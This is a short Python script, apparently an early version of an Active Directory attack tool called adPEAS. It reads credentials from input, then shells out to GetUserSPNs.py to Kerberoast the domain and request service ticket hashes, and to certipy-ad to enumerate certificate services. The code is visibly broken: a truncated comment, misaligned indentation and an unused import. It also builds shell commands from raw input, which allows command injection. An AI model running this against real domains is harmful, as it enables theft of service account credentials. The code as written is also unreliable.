import subprocess
from ldap3 import Server, Connection, SUBTREE

def find_and_kerberoast_objects(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controlle
            cmd = f"GetUserSPNs.py -dc-ip {dc_ip} {domain}/{username}:{password} -request"
            subprocess.run(cmd, shell=True)
    except Exception as e:
        print(f"Error while searching for kerberoastable objects or Kerberoasting: {e}")

def certipy(username, password, domain, dc_ip):
     try:
          cmd = f"certipy-ad find {username}@{domain}:{password} -dc-ip {dc_ip}"
          subprocess.run(cmd, shell=True)
     except Exception as e:
        print(f"Error while running Certipy: {e}")

# Example usage:
username = input("Enter username: ")
password = input("Enter password: ")
domain = input("Enter domain: ")
dc_ip = input("Enter domain controller IP or hostname: ")

print("Welcome to adPEAS v1.0!")
print("Attempting to kerberoast the domain...")
find_and_kerberoast_objects(username, password, domain, dc_ip)
print("Kerberoasting done!")
print("Attempting to find all ADCS infrastructure...")
certipy(username, password, domain, dc_ip)
print("Done finding all ADCS infrastructure")
